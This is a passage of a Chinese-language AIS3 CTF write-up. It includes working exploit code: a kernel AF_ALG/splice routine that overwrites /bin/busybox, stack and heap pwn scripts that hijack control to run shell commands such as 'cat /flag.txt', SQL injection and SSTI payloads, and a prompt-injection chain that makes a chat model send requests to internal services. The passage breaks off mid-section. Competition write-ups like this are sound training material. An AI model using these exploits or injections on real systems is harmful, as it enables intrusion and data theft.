static inline long sc6(long n, long a, long b, long c, long d, long e, long f)
{
  long r;
  register long r10 asm("r10") = d;
  register long r8 asm("r8") = e;
  register long r9 asm("r9") = f;
  asm volatile("syscall" : "=a"(r) : "a"(n), "D"(a), "S"(b), "d"(c), "r"(r10), "r"(r8), "r"(r9) : "rcx", "r11", "memory");
  return r;
}

static void puts1(const char *s)
{
  u64 n = 0;
  while (s[n]) n++;
  sc3(1, 1, (long)s, n);
}

static void z(void *p, u64 n)
{
  u8 *q = p;
  while (n--) *q++ = 0;
}

static void cp(void *d, const void *s, u64 n)
{
  u8 *dd = d;
  const u8 *ss = s;
  while (n--) *dd++ = *ss++;
}

static void cstr(u8 *d, const char *s)
{
  while ((*d++ = (u8)*s++));
}

static u64 a8(u64 x)
{
  return (x + 7) & ~7UL;
}

static int poke4(int fd, u64 off0, const u8 *x)
{
  long alg = sc3(41, AF_ALG, SOCK_SEQPACKET, 0);
  if (alg < 0) {
    puts1("sock\n");
    return -1;
  }

  struct sockaddr_alg sa;
  z(&sa, sizeof(sa));
  sa.salg_family = AF_ALG;
  cstr(sa.salg_type, "aead");
  cstr(sa.salg_name, "authencesn(hmac(sha256),cbc(aes))");

  if (sc3(49, alg, (long)&sa, sizeof(sa)) < 0) {
    puts1("bind\n");
    return -1;
  }

  u8 key[40];
  z(key, sizeof(key));
  key[0] = 0x08;
  key[2] = 0x01;
  key[7] = 0x10;

  if (sc5(54, alg, SOL_ALG, ALG_SET_KEY, (long)key, sizeof(key)) < 0) {
    puts1("key\n");
    return -1;
  }

  if (sc5(54, alg, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, 0, 4) < 0) {
    puts1("auth\n");
    return -1;
  }

  long op = sc3(43, alg, 0, 0);
  if (op < 0) {
    puts1("accept\n");
    return -1;
  }

  u8 data[8];
  data[0] = 'A';
  data[1] = 'A';
  data[2] = 'A';
  data[3] = 'A';
  cp(data + 4, x, 4);

  u8 ctl[128];
  z(ctl, sizeof(ctl));

  struct iovec iov;
  iov.iov_base = data;
  iov.iov_len = sizeof(data);

  struct msghdr msg;
  z(&msg, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  msg.msg_control = ctl;

  u64 off = 0;

  struct cmsghdr *c = (struct cmsghdr *)(ctl + off);
  c->cmsg_len = sizeof(struct cmsghdr) + 4;
  c->cmsg_level = SOL_ALG;
  c->cmsg_type = ALG_SET_OP;
  off += a8(c->cmsg_len);

  c = (struct cmsghdr *)(ctl + off);
  c->cmsg_len = sizeof(struct cmsghdr) + 20;
  c->cmsg_level = SOL_ALG;
  c->cmsg_type = ALG_SET_IV;
  ((u8 *)(c + 1))[0] = 0x10;
  off += a8(c->cmsg_len);

  c = (struct cmsghdr *)(ctl + off);
  c->cmsg_len = sizeof(struct cmsghdr) + 4;
  c->cmsg_level = SOL_ALG;
  c->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
  ((u8 *)(c + 1))[0] = 0x08;
  off += a8(c->cmsg_len);

  msg.msg_controllen = off;

  if (sc3(46, op, (long)&msg, MSG_MORE) < 0) {
    puts1("sendmsg\n");
    return -1;
  }

  int p[2];
  if (sc1(22, (long)p) < 0) {
    puts1("pipe\n");
    return -1;
  }

  u64 n = off0 + 4;
  u64 src = 0;

  sc6(275, fd, (long)&src, p[1], 0, n, 0);
  sc6(275, p[0], 0, op, 0, n, 0);

  char tmp[1024];
  sc6(45, op, (long)tmp, off0 + 8, 0, 0, 0);

  sc1(3, p[0]);
  sc1(3, p[1]);
  sc1(3, op);
  sc1(3, alg);
  return 0;
}

void _start()
{
  int fd = sc3(2, (long)"/bin/busybox", O_RDONLY, 0);
  if (fd < 0) {
    puts1("open\n");
    sc1(60, 1);
  }

  puts1("patch\n");

  for (u64 i = 0; i < sizeof(elf); i += 4) {
    u8 x[4] = {0, 0, 0, 0};
    u64 n = sizeof(elf) - i;
    if (n > 4) n = 4;

    cp(x, elf + i, n);

    if (poke4(fd, i, x) < 0) {
      sc1(60, 2);
    }
  }

  sc3(8, fd, 0, SEEK_SET);

  u8 b[32];
  sc3(0, fd, (long)b, sizeof(b));

  if (b[24] == 0x78 && b[25] == 0x00 && b[26] == 0x40) {
    puts1("readback_payload\n");
  } else {
    puts1("readback_orig\n");
  }

  puts1("done\n");
  sc1(60, 0);
}
```

### Flag

```text
AIS3{WHY_Ne3D_K3RN3L_z3R0_d@Y_wH3n_Y0u_aLr3Ady_h@cK3D_the_HYpeRvi5or}
```

---

## EasyFAULT

### 思路

題目隱藏 RSA modulus `n` 與 private exponent `d`，但公開 fault signatures：

```py
pow(c, d ^ row_i, n)
```

每個 `row_i` 都被以下方式 mask：

```py
shake_256(base || i)
```

另一份 leakage 提供足夠的模線性資訊，可以還原 192-bit `base`。Unmask rows 後，row bits 間的整數線性關係會轉換成 faulty signatures 的乘法關係，進而還原 `n`，最後用一條非齊次關係還原 `c^d = m`。

### 觀察

對 72 個 leaked rows 上的向量 `lambda`，未知係數會被消掉，`base` 可由下式估計：

```text
base = -sum(lambda_j * vals_j) / sum(lambda_j * bias_j)
```

重點是保留 exact rational / integer value，不要使用 floating-point rounded average。

精確 seed：

```text
6226901257745988517400304262260068971526607509066332027399
```

若使用 rounded candidate，SHAKE output 會錯，後續 RSA 階段也會失敗。

### 做法

Unmask rows：

```py
row_i = masked_i ^ shake_256(
    base.to_bytes(24, "big") + i.to_bytes(4, "big")
).digest(56)
```

找 homogeneous integer relations：

```text
sum(lambda_i) = 0
sum(lambda_i * bit_k(row_i)) = 0    for all k
```

則：

```text
prod(sig_i ^ lambda_i) == 1 mod n
```

因此：

```text
prod_positive - prod_negative
```

會是 `n` 的倍數。對多條 relations 取 GCD，並移除小雜因數，即可還原 `n`。

接著找 inhomogeneous integer relation：

```text
sum(lambda_i) = 1
sum(lambda_i * bit_k(row_i)) = 0    for all k
```

這會讓 exponent sum 等於 `d`，所以：

```text
prod(sig_i ^ lambda_i) == c^d == m mod n
```

最後將 `m` 轉 bytes 得到 flag。

### 留下的檔案 / 片段

```text
chal.py
output.txt
bkz_search.py
row_exact_q1e9_raw.mat
row_exact_q1e9.red
g_exact_checkpoint.txt
flag.txt
```

```sh
python bkz_search.py
flatter row_exact_q1e9_raw.mat row_exact_q1e9.red
python -m pip install python-flint
```

### Solver 重點

```py
from hashlib import shake_256
import re

import gmpy2
from Crypto.Util.number import long_to_bytes
from flint import fmpz_mat

BITS = 448
WIDTH = 192
NROWS = 896
BASE = 6226901257745988517400304262260068971526607509066332027399


def mask(base, idx):
    seed = base.to_bytes(WIDTH // 8, "big") + idx.to_bytes(4, "big")
    return int.from_bytes(shake_256(seed).digest(BITS // 8), "big")


def load_instance():
    ns = {}
    with open("output.txt") as f:
        exec(f.read(), ns)
    c = ns["c"]
    data = ns["data"]
    rows = [x ^ mask(BASE, i) for i, (x, _) in enumerate(data)]
    sigs = [gmpy2.mpz(y) for _, y in data]
    return c, rows, sigs
```

Homogeneous relation 用來回收 modulus；inhomogeneous relation 用來回收 plaintext。

### Flag

```text
AIS3{lll_then_lll_then_lll_then_lll_owob}
```

---

## blooockchain

### 思路

Ledger 使用：

```c
strncat(chain, hex, 0x20)
```

把 SHA-256 bytes 存進 512-byte stack buffer，但列印 ledger 時信任 transaction counter。填滿 16 筆完整 transactions 後，額外 records 可 leak saved stack data，並逐 byte 覆寫 saved return address。

最後不硬湊完整 ROP chain，而是 return 到 input validation 之後的 command-building block，濫用既有：

```c
popen("echo -n \"%s\" | sha256sum")
```

達成 command injection。

### 觀察

重要 offsets：

```text
chain buffer:                    rbp-0x200
saved RIP leak:                  0x208
PIE main leak:                   0x238
main:                            0x1849
post-validation command block:   0x15bd
```

### 做法

1. 使用 SHA-256 output 不含 NUL bytes 的 transactions 填滿 `0x200` bytes chain buffer。
2. 加入 NUL-prefix transactions 增加 counter，但不推進 `strlen(chain)`。
3. 選擇 `View ledger`，程式會印出：

```text
counter * 0x20 bytes from rbp-0x200
```

因此可 leak buffer 後方的 stack data。

4. 從 leaked main pointer 推回 PIE base：

```text
pie_base = leak[0x238:0x240] - 0x1849
```

5. 挖出 SHA-256 output 以 `[wanted_byte, 0x00]` 開頭的 transaction values。
6. 每筆 transaction append 一個可控 non-zero byte，並留下 terminating NUL，形成 byte-wise overwrite primitive。
7. 覆寫 saved RBP 為 filler，saved RIP 為 `pie_base + 0x15bd`。
8. Return 前送 invalid `from` account，讓全域 `from` buffer 含 shell syntax，同時 validation fail 回到 menu。
9. 選擇 exit，函式 return 到 post-validation command block。

最終 payload：

```text
";cat${IFS}/flag.txt>&2;#
```

產生的 command：

```sh
echo -n "From: ";cat${IFS}/flag.txt>&2;#, To: , Money: " | sha256sum
```

`cat` output 被送到 stderr，而 stderr 由 service socket 繼承，因此可以看到 flag。

### Exploit

```py
#!/usr/bin/env python3
from hashlib import sha256
import re
import struct
import sys

from pwn import remote

FROM = "aa"
TO = "bb"
FULL_TX = "0"
ZERO_TX = "b0"
MAIN_OFF = 0x1849
CMD_BLOCK_OFF = 0x15BD

cache = {}


def digest_for(money: str) -> bytes:
    return sha256(f"From: {FROM}, To: {TO}, Money: {money}".encode()).digest()


def tx_with_prefix(prefix: bytes) -> str:
    if prefix in cache:
        return cache[prefix]
    for i in range(4_000_000):
        money = f"{i:x}"
        if digest_for(money).startswith(prefix):
            cache[prefix] = money
            return money
    raise RuntimeError(f"cannot mine hash prefix {prefix.hex()}")


def add_tx(io, money: str) -> None:
    io.sendline(b"1")
    io.sendlineafter(b"Enter From account: ", FROM.encode())
    io.sendlineafter(b"Enter To account: ", TO.encode())
    io.sendlineafter(b"Enter Money amount: ", money.encode())
    io.recvuntil(b"Enter your choice: ")


def view_chain(io) -> bytes:
    io.sendline(b"2")
    out = io.recvuntil(b"Enter your choice: ")
    lines = [
        line.strip()
        for line in out.splitlines()
        if re.fullmatch(rb"[0-9a-f]{64}", line.strip())
    ]
    return bytes.fromhex(b"".join(lines).decode())


def write_byte(io, value: int) -> None:
    add_tx(io, tx_with_prefix(bytes([value, 0])))


def overwrite_saved_rip(io, target: int) -> None:
    for value in b"BBBBBBBB":
        write_byte(io, value)
    for value in target.to_bytes(8, "little")[:6]:
        write_byte(io, value)


def exploit(host: str, port: int) -> None:
    io = remote(host, port)
    io.recvuntil(b"Enter your choice: ")

    for _ in range(16):
        add_tx(io, FULL_TX)
    for _ in range(4):
        add_tx(io, ZERO_TX)

    leak = view_chain(io)
    pie_base = struct.unpack("<Q", leak[0x238:0x240])[0] - MAIN_OFF
    overwrite_saved_rip(io, pie_base + CMD_BLOCK_OFF)

    payload = b'";cat${IFS}/flag.txt>&2;#'
    io.sendline(b"1")
    io.sendlineafter(b"Enter From account: ", payload)
    io.recvuntil(b"Enter your choice: ")
    io.sendline(b"3")
    print(io.recvall(timeout=10).decode("latin1", "replace"))


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <host> <port>")
        raise SystemExit(1)
    exploit(sys.argv[1], int(sys.argv[2]))
```

### Flag

```text
AIS3{SIMPl3_BLocKch@1n_n0t_s1mple_Pwn}
```

---

## 特別的愛給特別的你

### 思路

題目給一次任意 8-byte write，接著呼叫：

```c
printf("write %lx -> %p\n", value, target);
_exit(0);
```

因為 `_exit(0)` 阻斷一般 return / exit-handler 攻擊，Full RELRO 也擋掉 GOT overwrite，所以真正可用的控制點在最後一次 `printf`。

在 Ubuntu 25.04 glibc 2.41 中，`vfprintf` 在 `__printf_function_table` 非 null 時，會查 hidden printf extension tables。一次 unaligned 8-byte write 可以同時：

1. 讓 `__printf_function_table` 變成 nonzero。
2. 把 `__printf_arginfo_table` 設成由 stack leak 推出的可控地址。

### Leaks

Constructor 會 leak 三個值：

```text
init_program: <pie + 0x1213>
puts:         <libc + 0x8db60>
lol:          <constructor stack local>
```

`win()` 位於 `pie + 0x11f9`，功能是執行 `system("/bin/sh")`。

### 做法

先計算 bases：

```py
pie  = init_program_leak - 0x1213
libc = puts_leak - 0x8db60
win  = pie + 0x11f9
```

在題目 runtime 中，leaked `lol` 與目前存放 `main` 的 stack slot 有穩定關係：

```py
slot_main = lol - 0x6c
```

讓 `__printf_arginfo_table['x']` 指向該 slot。因為最終 format 的第一個 conversion 是 `%lx`，glibc 會查 index `'x' == 0x78`，所以 table base 要設成：

```py
base_x = slot_main - 0x78 * 8
       = lol - 0x42c
```

第一次 arbitrary write：

```py
target = libc + 0x212707
value  = ((lol - 0x42c) << 8) | 1
```

效果：

```text
__printf_function_table = nonzero
__printf_arginfo_table = lol - 0x42c
__printf_arginfo_table['x'] = *(lol - 0x6c) = main
```

因此最後的 `printf` 會間接呼叫 `main`，在 `_exit` 前取得第二次 arbitrary write。

第二次 prompt 時，把同一個 stack slot 改成 `win`：

```py
target = lol - 0x6c
value  = pie + 0x11f9
```

當遞迴呼叫的 `main` 再次走到最後的 `printf`，`%lx` arginfo lookup 就會跳到 `win()`，拿到 shell。

### Exploit

```py
from pwn import *

HOST = "chals1.ais3.org"
PORT = 41240

INIT_PROGRAM_OFF = 0x1213
PUTS_OFF = 0x8DB60
WIN_OFF = 0x11F9
PRINTF_TABLE_SPLIT = 0x212707

STACK_MAIN_SLOT_DELTA = 0x6C
PRINTF_X_ARGINFO_DELTA = 0x42C


def read_leaks(io):
    io.recvline()
    init_program = int(io.recvline().decode().split(": ")[1], 16)
    puts = int(io.recvline().decode().split(": ")[1], 16)
    lol = int(io.recvline().decode().split(": ")[1], 16)
    io.recvline()
    return init_program, puts, lol


def send_write(io, target, value):
    io.sendline(f"{target:#x} {value:x}".encode())


def main():
    io = remote(HOST, PORT)

    init_program, puts, lol = read_leaks(io)
    pie = init_program - INIT_PROGRAM_OFF
    libc = puts - PUTS_OFF
    win = pie + WIN_OFF

    send_write(io, libc + PRINTF_TABLE_SPLIT, ((lol - PRINTF_X_ARGINFO_DELTA) << 8) | 1)
    io.recvuntil(b"An special arbitrary write for a special you!!!\n")

    send_write(io, lol - STACK_MAIN_SLOT_DELTA, win)
    io.sendline(b"cat flag.txt")

    print(io.recvall(timeout=5).decode(), end="")


if __name__ == "__main__":
    main()
```

### Flag

```text
AIS3{This_Is_a_SpeCia1_LLLLLLLLLOVE_FOR_y0U@Do_Y0u_L1k3_mY_lOv3?}
```

---

## Tea God World Adventure

### 思路

這題一開始不要直接對 `blackbox-web` 發請求，而是先登入前台聊天服務，利用它背後可以存取內網 `http://blackbox-web:8080` 的能力，讓模型替我們發內網請求。接著再從 `/api/tool-log` 與模型回傳內容還原內網服務行為，串出整條利用鏈。

最後串起來是：

```text
→ prompt injection / tool use 讓模型打內網 blackbox-web
→ 發現 Legacy Report Service
→ /docs LFI 讀 /app/app.py
→ 讀出 /admin/render 的 audit token 算法與 Jinja SSTI
→ /proc/self/environ 洩漏 AUDIT_SECRET
→ 算出 X-Audit-Token
→ SSTI 執行 /readflag，把 flag 寫到 /tmp
→ LFI 讀 /tmp/flag_leak.txt
```

### 觀察

- 前台提供 `/api/chat` 與 `/api/tool-log`。
- 雖然前台表面上是劇情聊天服務，但特定 prompt 可以誘導模型實際對內網 URL 發 request。
- 內網目標是 `http://blackbox-web:8080`。
- `blackbox-web` 根目錄會回傳 `Legacy Report Service`，並提示文件入口 `/docs?file=welcome.txt`。
- `/docs` 存在 LFI，可以讀 `/app/app.py` 與 `/proc/self/environ`。
- `/admin/render` 有 Jinja SSTI，但需要正確的 `X-Audit-Token`。
- `AUDIT_SECRET` 可以從環境變數讀出。
- `/flag` 不能直接用 Flask 身分讀，需要透過 setuid 的 `/readflag` 讀出後寫到 `/tmp`。

### 利用鏈

1. 透過 `/api/chat` 下 prompt，讓模型替我們訪問內網 `http://blackbox-web:8080`。
2. 從 `/api/tool-log` 與模型回傳內容確認觸發了對應請求。
3. 根目錄回傳內容顯示它是 `Legacy Report Service`，並提示 `/docs?file=welcome.txt`。
4. 測試並確認 `/docs` 有 LFI：

```text
http://blackbox-web:8080/docs?file=/app/app.py
```

5. 從 `app.py` 讀到三個重點：

   - `/docs` 直接把 `DOC_ROOT / name` 當成目標檔案，沒有做 `resolve()` 或目錄邊界檢查。
   - `/admin/render` 需要 `X-Audit-Token`。
   - `/admin/render` 存在 Jinja SSTI，且 `env.globals["os"] = os`。

6. 繼續用 LFI 讀環境變數：

```text
http://blackbox-web:8080/docs?file=/proc/self/environ
```

7. 取得 `AUDIT_SECRET=legacy-report-audit-secret`。

8. 依比賽當下的 UTC 日期 `20260516` 計算 audit token：

```text
sha256("legacy-report-audit-secret20260516")[:16] = 3eac6480714cf2ce
```

9. 帶上 `X-Audit-Token` 打 `/admin/render`，送入 Jinja SSTI，執行 `/readflag` 並把結果寫到 `/tmp/flag_leak.txt`。
10. 最後再用 LFI 讀 `/tmp/flag_leak.txt`，拿到 flag。

> 實際重跑時，audit token 需要依服務使用的 UTC 日期重新計算。

### 關鍵原始碼

`/docs` 的問題在於直接把使用者提供的 `file` 接到 `DOC_ROOT` 後讀檔，沒有 canonicalize，也沒有檢查最後路徑是否仍在文件目錄內：

```py
@app.get("/docs")
def docs():
    name = request.args.get("file", "welcome.txt")
    target = DOC_ROOT / name
    raw = target.read_bytes()
```

`/admin/render` 的 token 只依賴固定 secret 與 UTC 日期：

```py
def audit_token() -> str:
    raw = f"{AUDIT_SECRET}{audit_date()}".encode()
    return hashlib.sha256(raw).hexdigest()[:16]
```

`/admin/render` 內建立 Jinja environment 後，把 `os` 放進 template globals，因此拿到 token 後就能直接透過 SSTI 執行 shell command：

```py
@app.post("/admin/render")
def admin_render():
    supplied = request.headers.get("X-Audit-Token", "")
    if supplied != audit_token():
        return jsonify({"error": "invalid audit token"}), 403

    env = jinja2.Environment(autoescape=True)
    env.globals["os"] = os
    rendered = env.from_string(template).render()
```

### 實際走法

1. 登入前台：

```http
POST /api/login
Content-Type: application/json

{"token":"ctfd_..."}
```

登入成功後會拿到 `tea_session`。

2. 用 prompt 讓模型幫忙打內網根目錄，回傳內容顯示：

```json
{
  "service": "Legacy Report Service",
  "message": "Internal reporting utility.",
  "docs": "/docs?file=welcome.txt",
  "health": "/healthz"
}
```

3. 用 prompt 讀內網服務原始碼與環境變數。

4. 算 audit token：

```py
import hashlib

secret = "legacy-report-audit-secret"
date = "20260516"
token = hashlib.sha256(f"{secret}{date}".encode()).hexdigest()[:16]
print(token)  # 3eac6480714cf2ce
```

5. 讓模型發內網 POST 到 `/admin/render`：

```http
POST http://blackbox-web:8080/admin/render
X-Audit-Token: 3eac6480714cf2ce
Content-Type: application/json

{"template":"{{ os.popen('/readflag > /tmp/flag_leak.txt').read() }}"}
```

6. 再用 LFI 讀出結果：

```text
http://blackbox-web:8080/docs?file=/tmp/flag_leak.txt
```

### 為什麼不能直接讀 `/flag`

`/flag` 權限是 `0400 root:root`，而 Flask 服務是用 `ctf` 身分執行，所以直接透過 LFI 讀 `/flag` 只會噴 500。

因此要改用 setuid 的 `/readflag` 幫我們讀 flag，再把結果寫到 Flask 可以讀的 `/tmp/flag_leak.txt`，最後透過 LFI 取回。

### Flag

```text
AIS3{734_60d_f1l3l355_rc3_1n_4n07h3r_w0rld}
```

---

## MyGO!!!!! X Ave Mujica 圖庫

### 思路

網站會在 `robots.txt` 暗示存在隱藏的 `.svn` working copy。雖然 `.svn` 檔案不能直接以路由存取，但 `/image?id=` 會把未過濾的 `id` 直接拼進 SQL query，並把查詢到的 `path` 傳給 Flask `send_file()`。

因此可以利用 SQL injection 的 `UNION SELECT` 控制回傳的檔案路徑，藉由 `/image` 讀出 app 目錄中的任意相對檔案。

### 觀察

- `/robots.txt` 會回傳 `.svn`，表示部署目錄中存在 SVN metadata。
- `/image?id=` 的 SQL query 沒有參數化。
- 查到的 `path` 會直接丟給 `send_file()`。
- 只要能讓 SQL query 回傳任意字串，就能控制 `send_file()` 讀哪個相對路徑。

### 做法

1. 讀 `/robots.txt`，看到 `.svn`。
2. 確認 `/image?id=` 直接把 query string 中的 `id` 放進 SQL：

```py
cur = db.execute(f"SELECT path FROM images WHERE id = {image_id};").fetchone()
return send_file(cur[0])
```

3. 用 `UNION SELECT` 控制回傳檔案路徑，先驗證可以控制 file selection。
4. 讀 SVN working-copy database `.svn/wc.db`。
5. 檢查 `NODES` table，找到 flag 檔名 `super_secret_starburst_flag114514.txt`。
6. 透過同樣 SQL injection 讀 flag 檔。

### Payload

```text
/image?id=-1 UNION SELECT 'robots.txt'--
/image?id=-1 UNION SELECT '.svn/wc.db'--
/image?id=-1 UNION SELECT 'super_secret_starburst_flag114514.txt'--
```

### Flag

```text
AIS3{BangDream_AveMujica_Exitus_at_Taiwan_8/8_and_I_don't_have_ticket}
```

---

## 哇!金色傳說

### 思路

`B.zip` 是 Mono Unity build，所以遊戲邏輯位於：

```text
Reverse1_Data/Managed/Assembly-CSharp.dll
```

靜態檢查 `GachaServer` 後可以看到遊戲會向 `http://chals1.ais3.org:50001` 發 gacha request，JSON 欄位包含 `spend`、`rate`、`username`、`gold`、`score`、`kills`。Unity client 會用 `Random.Range(0.0, 0.3)` 產生 `rate`，但遠端 server 信任 client 送來的 `rate`。

因此只要偽造一個更大的 `rate`，就能讓 server 回傳 flag。

### 觀察

- 這題是 Unity Mono，邏輯在 managed assembly。
- `GameManager` 中有 hardcoded gacha server URL。
- `GachaServer+<RollCoroutine>d__7.MoveNext` 會送出類似：

```json
{"spend":50,"rate":0.1234,"username":"Anonymous","gold":0,"score":0,"kills":0}
```

- Client 正常只會產生 `0.0` 到 `0.3` 的 `rate`。
- Server 沒重新計算或驗證 `rate`，因此可以直接偽造。

### 做法

1. 解開遊戲並檢查 managed Unity assembly。
2. 在 `GameManager` 找到 gacha server URL。
3. 在 `GachaServer+<RollCoroutine>d__7.MoveNext` 確認 POST body 格式。
4. 送出偽造 JSON，將 `rate` 設為 `0.5`。
5. Server 會把 flag 作為 armor name 回傳。

### Payload

```json
{"spend":50,"rate":0.5,"username":"Anonymous","gold":0,"score":0,"kills":0}
```

### Flag

```text
AIS3{At_Least_U_DIDNT_MODIFY_MY_MONEY_RIGHT?}
```

---

## ooonvifd

### 思路

`onvifd` 是一個長時間執行的 ONVIF-like HTTP service。漏洞在 multipart / MTOM MIME parser：解析 MIME data 時，位於 `0x200` part buffer 尾端附近的假 boundary sequence 會被複製到 part buffer，但沒有檢查容量，造成 heap overflow，並覆寫下一個 MIME data chunk 的 metadata。

在 Ubuntu 20.04 glibc 2.31 上沒有 tcache safe-linking，因此可以利用 overflow poison cached chunk 的 `fd` pointer。

### 觀察

- 目標環境是 Ubuntu 20.04 glibc 2.31。
- tcache 沒有 safe-linking。
- MIME parser 的錯誤 boundary 處理可造成 heap overflow。
- 三個 `0x210` chunks 不夠，因為 tcache count 會在回傳 forged pointer 前歸零。
- 實際可用 exploit 需要先 groom 七個 MIME data chunks。

### 做法

有用的 allocator 細節是 tcache count。

如果只 groom 三個 `0x210` chunks，即使 poison 第三個 chunk 的 `fd`，在 pop 出真 chunks 後，tcache count 會先歸零，`malloc()` 不會回傳 forged pointer。

可行的本地 exploit 是：

1. 先 groom 七個 MIME data chunks。
2. 再分配兩個 chunks。
3. overflow 第二個 chunk，覆寫仍在 cache 中的第三個 chunk。
4. 截斷七筆 chain，讓 tcache count 還夠支撐 forged pointer 被回傳。

本地 proof 目標是 `__free_hook - 0x18`，forged allocation 內容為：

```text
cat /flag.txt >&4\0
padding to 0x18
system
```

在 request cleanup 時 `free(__free_hook - 0x18)` 會變成 `system("cat /flag.txt >&4")`。

Flag 會被寫回 accepted client socket。本地 Docker 驗證拿到 dummy flag：

```text
AIS3{test_flag_for_local}
```

遠端方面，一個正常 max-length `Host:` request 已經會透過 `GetCapabilities` response 裡的 `%s` 洩漏 request-context memory。把 leaked libc pointers 對上本地 Ubuntu 20.04 layout 後，推得遠端 libc base：

```text
0x7fb5a6ffb083 - 0x24083 = 0x7fb5a6fd7000
```

使用該 base 搭配同樣的 seven-entry tcache groom 就能取得真 flag。

### 執行

```bash
# Build and run the local target
docker build -t ooonvifd-local /tmp/ooonvifd/unpacked
docker run -d -p 18204:8080 --name ooonvifd-localrun ooonvifd-local /challenge/onvifd

# Run the local proof; --container is used only to read the local libc base.
python3 /tmp/ooonvifd/solve_local.py --port 18204 --container ooonvifd-localrun

# Remote run after starting the instancer and deriving libc base from the Host leak.
python3 /tmp/ooonvifd/solve_local.py \
  --host chals1.ais3.org \
  --port 40080 \
  --libc-base 0x7fb5a6fd7000
```

### Exploit

```python
#!/usr/bin/env python3
import argparse
import re
import socket
import struct
import subprocess


LIBC_FREE_HOOK = 0x1EEE48
LIBC_SYSTEM = 0x52290


SOAP = b"<s:Envelope><s:Body><tds:GetCapabilities/></s:Body></s:Envelope>"


def request(host: str, port: int, data: bytes, timeout: float = 10.0) -> bytes:
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.sendall(data)
        sock.shutdown(socket.SHUT_WR)
        out = bytearray()
        while True:
            try:
                chunk = sock.recv(8192)
            except OSError:
                break
            if not chunk:
                break
            out += chunk
        return bytes(out)


def mtom(parts: list[tuple[bytes, bytes]], boundary: bytes, host_header: bytes = b"X") -> bytes:
    body = bytearray()
    for headers, data in parts:
        body += b"--" + boundary + b"\r\n" + headers + b"\r\n\r\n" + data + b"\r\n"
    body += b"--" + boundary + b"--\r\n"
    return (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + host_header + b"\r\n"
        b"Content-Type: multipart/related; boundary=\"" + boundary + b"\"\r\n"
        b"Content-Length: 1\r\n\r\n" + bytes(body)
    )


def libc_base_from_container(container: str) -> int:
    maps = subprocess.check_output(
        ["docker", "exec", container, "sh", "-c", "pid=$(pidof onvifd); cat /proc/$pid/maps"],
        text=True,
    )
    match = re.search(r"([0-9a-f]+)-[0-9a-f]+ r--p .*libc-2\.31\.so", maps)
    if not match:
        raise RuntimeError("could not find libc base in container maps")
    return int(match.group(1), 16)


def exploit(host: str, port: int, libc_base: int) -> bytes:
    free_hook = libc_base + LIBC_FREE_HOOK
    system = libc_base + LIBC_SYSTEM
    target = free_hook - 0x18

    # 1. Fill the 0x210 tcache bin with seven MIME data chunks. Seven is
    # important: after the poisoned chain is truncated, the tcache count must
    # still be high enough for malloc() to return the forged pointer.
    groom_parts = [(b"H", SOAP)] + [(b"H", b"A" * 8) for _ in range(6)]
    request(host, port, mtom(groom_parts, b"G"))

    # 2. Allocate two chunks and overflow the second chunk into the still-cached
    # third chunk's fd, replacing it with (__free_hook - 0x18). The mismatch NULs
    # live in the MIME body, not in the HTTP boundary header.
    boundary = b"Q" * 5 + struct.pack("<Q", 0x211) + target.to_bytes(8, "little")[:6]
    poison = SOAP + b"A" * (0x1FF - len(SOAP)) + b"\r\n--" + boundary + b"\x00\x00"
    request(host, port, mtom([(b"H", SOAP), (b"H", poison)], boundary))

    # 3. The fourth MIME data allocation now returns __free_hook - 0x18. Put a
    # shell command at the start of that allocation and system() at __free_hook.
    command = b"cat /flag.txt >&4\x00"
    payload = command.ljust(0x18, b"X") + struct.pack("<Q", system)
    return request(
        host,
        port,
        mtom([(b"H", SOAP), (b"H", b"2" * 8), (b"H", b"3" * 8), (b"H", payload)], b"N"),
    )


def main() -> None:
    parser = argparse.ArgumentParser(description="Local ooonvifd exploit proof")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=18204)
    parser.add_argument("--libc-base", type=lambda value: int(value, 0))
    parser.add_argument("--container", help="Docker container name to read libc base from")
    args = parser.parse_args()

    libc_base = args.libc_base
    if libc_base is None:
        if not args.container:
            raise SystemExit("provide --libc-base or --container for the local proof")
        libc_base = libc_base_from_container(args.container)

    print(exploit(args.host, args.port, libc_base).decode("latin-1", errors="replace"))


if __name__ == "__main__":
    main()
```

### Flag

```text
AIS3{LiTTL3_Re@L_wORlD_pWN_BU7_I_tHInK_ai_Wri735_3Xplo1t_Fa5t3R}
```

---

## EasyZKP

### 思路

題目有兩個服務角色：`prover` 和 `verifier`。`verifier` 提供兩個功能：

1. 向 `prover` 要 proof 的 oracle。
2. 正式 challenge，需要連續通過 16 輪 proof 驗證。

proof 函式長這樣：

```py
def compute_proof_from_digest(digest, seed):
    value = 0
    for byte in digest:
        for offset in range(7, -1, -1):
            if (byte >> offset) & 1 == 0:
                value = (value + seed) % N
            else:
                value = pow(value, seed, N)
    return value
```

其中 `digest = sha256(flag + suffix)`。

在 challenge 模式中，`verifier` 會給一段 server suffix，玩家提供 nonce，最後 suffix 是 `decode(nonce) + server_suffix`。

整題的關鍵是：oracle request 的 query string 沒有正確 URL encode，導致可以注入 `s` 參數並控制 prover 使用的 seed。接著利用 bit flip oracle 回收 SHA-256 digest，再用 SHA-256 length extension 偽造 16 輪 challenge 所需 proof。

### 漏洞點

在 oracle 模式中，`verifier` 會幫玩家向 `prover` 發 HTTP request：

```py
url = f"{PROVER_URL}?p={server_part_b64}{flip_query}&d={user_part_b64}&s={seed}"
```

問題是 `user_part_b64` 完全沒有 URL encode。

因此可以讓 nonce 變成 `&s=5`，實際 URL 會變成類似：

```text
/prove?p=<server>&d=&s=5&s=<hidden_seed>
```

`prover` 端使用：

```py
query = parse_qs(parsed.query, keep_blank_values=True)
seed = int(query["s"][0])
```

所以 `prover` 會取第一個 `s=5`，導致我們可以控制 prover 使用的 seed。

### 還原 SHA-256 digest

選 `seed = 5` 是關鍵。模數：

```text
N = 1371086445846712667727718527036585861739497962228620061686456237722902428356146756731186939
```

可以分解成：

```text
p = 1062991560384192946446466724143851978243633013
q = 1289837564986090927380812179078126226643568303
```

因為 `gcd(5, lambda(N)) = 1`，所以 `x -> x^5 mod N` 是可逆的。

Oracle 還提供 bit flip 功能，可以翻轉 digest 的某一個 bit 後再取得 proof。proof 函式是逐 bit 計算的，所以可以從 digest 後面往前倒推。

做法是：

